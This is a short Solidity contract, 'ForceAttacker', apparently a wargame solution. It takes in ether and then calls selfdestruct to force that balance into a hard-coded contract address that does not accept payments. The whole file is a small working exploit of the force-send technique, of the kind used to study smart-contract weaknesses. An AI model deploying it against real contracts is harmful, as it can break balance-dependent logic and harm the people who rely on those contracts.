// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract ForceAttacker{
    function  sendBalanceToOtherContract() public {
        address contractAddress = 0x3274A961EF6CD86190062A5463d6C7164c63774a;
        selfdestruct(payable(contractAddress));

    }
    receive() external payable {

    }
}